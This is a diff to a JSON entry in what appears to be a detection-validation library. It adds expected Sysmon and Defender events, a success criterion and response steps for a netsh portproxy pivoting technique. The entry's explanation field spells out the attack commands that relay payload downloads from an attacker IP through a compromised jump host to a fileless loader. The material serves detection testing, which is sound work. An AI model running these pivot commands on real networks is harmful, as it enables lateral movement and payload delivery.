@@ -188,6 +188,35 @@
         "defender-endpoint",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "defender-endpoint",
+          "description": "Pivoting with netsh portproxy + winrs - Sentinel"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "1",
+          "description": "Process creation (Sysmon)"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "13",
+          "description": "Registry value set (Sysmon)"
+        },
+        {
+          "source": "sysmon",
+          "description": "proc_creation_win_netsh_port_forwarding"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review Microsoft Defender for Endpoint, Sysmon for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Turns a compromised jump host into a relay so deep hosts that cannot reach your box can fetch payloads:\n  netsh interface portproxy add v4tov4   add an IPv4->IPv4 forward on the jump host\n  listenport=<listen_port> listenaddress=0.0.0.0   accept connections on this port, all interfaces\n  connectport=<dst_port> connectaddress=<attacker_ip>   forward them to your web server\nThen tools on the deep host (Loader.exe -path http://127.0.0.1:<listen_port>/...) reach you through the jump host, fileless."
